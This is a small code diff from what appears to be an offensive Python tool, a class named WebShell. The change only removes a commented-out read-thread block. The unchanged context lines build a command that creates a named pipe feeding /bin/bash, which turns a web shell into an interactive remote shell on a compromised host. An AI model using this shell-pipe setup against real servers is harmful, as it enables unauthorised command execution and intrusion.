@@ -26,14 +26,6 @@ class WebShell(object):
         MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/bash 2>&1 > {self.stdout}"
         self.RunRawCmd(MakeNamedPipes, timeout=0.1)
         
-        """
-        print("[*] Setting up read thread")
-        self.interval = 5
-        thread = threading.Thread(target=self.ReadThread, args=())
-        thread.daemon = False
-        thread.start()
-        """
-        
     def ReadThread(self):
         GetOutput = f"cat {self.stdout}"
         while True:
